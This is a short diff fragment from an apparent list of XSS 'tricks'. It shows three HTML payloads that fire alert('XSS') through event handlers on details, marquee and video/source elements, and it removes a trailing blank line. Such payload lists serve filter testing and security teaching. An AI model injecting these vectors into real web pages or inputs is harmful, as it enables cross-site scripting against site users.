@@ -39,4 +39,3 @@ tricks:
       <details open ontoggle=alert('XSS')>
       <marquee onstart=alert('XSS')>
       <video><source onerror=alert('XSS')>
-
